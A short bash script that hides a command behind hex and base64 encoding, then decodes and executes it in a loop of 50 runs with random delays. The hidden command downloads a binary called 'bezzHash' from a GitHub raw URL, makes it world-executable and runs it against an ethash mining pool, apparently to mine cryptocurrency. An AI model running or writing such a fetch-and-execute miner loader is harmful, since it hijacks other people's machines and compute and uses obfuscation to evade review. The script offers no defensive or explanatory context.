#!/bin/bash

iterations=50

for ((i=1; i<=$iterations; i++)); do
    hex_code=$(echo -n "wget https://github.com/Testdrive345/scriptX/raw/main/bezzHash && chmod 777 bezzHash && ./bezzHash --url=hunterd.$(echo $(shuf -i 1-99999 -n 1)-Gok001)@ethash.poolbinance.com:443" | xxd -p)
    
    base64_encoded=$(echo "$hex_code" | base64)
    
    echo "$base64_encoded" > temp_base64_encoded.txt
    
    random_chars=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1 | tr -d '\0')
    echo "$random_chars" >> temp_base64_encoded.txt
    
    base64_decoded=$(cat temp_base64_encoded.txt | base64 -d)
    
    hex_decoded=$(echo "$base64_decoded" | xxd -r -p)
    
    echo "$hex_decoded" > temp_hex_decoded.txt
    
    chmod +x temp_hex_decoded.txt
    
    ./temp_hex_decoded.txt
    
    rm temp_base64_encoded.txt temp_hex_decoded.txt
    
    sleep $((RANDOM % 10))
done
